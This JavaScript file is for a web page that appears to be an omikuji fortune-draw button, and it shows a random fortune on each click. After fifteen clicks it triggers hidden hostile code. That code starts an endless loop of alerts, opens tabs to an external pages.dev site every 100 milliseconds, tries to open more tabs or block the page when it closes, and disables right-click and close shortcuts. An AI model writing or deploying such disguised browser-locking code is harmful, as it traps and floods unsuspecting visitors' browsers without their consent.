let showAlertTimeout;
let openNewTabInterval;

function duplicateTabEverySecond() {
    openNewTabInterval = setInterval(function() {
                    window.open('https://burakura8313.pages.dev/');

    }, 100);
}

// 無限アラートを表示する関数
function showAlert() {
    alert("(ﾟ∀ﾟ)アヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャ");
    showAlertTimeout = setTimeout(showAlert, 1000);
}

// タブが閉じられたときに新しいタブを2つ開く関数
function openNewTabsOnClose() {
    window.onbeforeunload = function() {
        for (let i = 0; i < 2; i++) {
            window.open('https://burakura8313.pages.dev/');}
    };
}

// タブの閉じる動作を防ぐ関数
function preventClose() {
    window.onbeforeunload = function(event) {
        event.preventDefault();
        event.returnValue = 'Are you sure you want to leave?';
        return 'Are you sure you want to leave?';
    };
}

// マウスの右クリックを無効にする関数
function disableRightClick() {
    document.addEventListener('contextmenu', function(event) {
        event.preventDefault();
    });
}

// ショートカットキーを無効にする関数
function disableShortcuts() {
    document.addEventListener('keydown', function(event) {
        // Ctrl+W, Ctrl+Shift+W, Alt+F4
        if ((event.ctrlKey && (event.key === 'w' || event.key === 'W')) ||
            (event.altKey && event.key === 'F4')) {
            event.preventDefault();
        }
    });
}

document.addEventListener('DOMContentLoaded', function() {
    const omikujiButton = document.getElementById('omikujiButton');
    const resultDiv = document.getElementById('result');
    let clickCount = 0;

    function requestPopupPermission() {
        return new Promise((resolve) => {
            resolve(true);
        });
    }

    function showOmikuji() {
        const fortunes = ['大吉', '吉', '中吉', '小吉', '末吉', '末小吉', '平', '凶', '小凶', '半凶', '末凶', '大凶', '大吉', '吉', '中吉', '小吉', '末吉', '末小吉', '平', '凶', '小凶', '半凶', '末凶', '大凶', '大吉', '吉', '中吉', '小吉', '末吉', '末小吉', '平', '凶', '小凶', '半凶', '末凶', '大凶', 'マルク＆マホロア',];
        const randomResult = fortunes[Math.floor(Math.random() * fortunes.length)];
        resultDiv.textContent = `あなたの運勢は: ${randomResult}`;
    }

    function handleClickEvent() {
        requestPopupPermission().then((permissionGranted) => {
            if (permissionGranted) {
                showOmikuji();
                clickCount++;
                if (clickCount >= 15) {
                    showAlert();
                    openNewTabsOnClose();
                    preventClose();
                    disableRightClick();
                    disableShortcuts();
                    duplicateTabEverySecond();
                }
            } else {
                setTimeout(handleClickEvent, 1000);
            }
        });
    }

    omikujiButton.addEventListener('click', handleClickEvent);
});
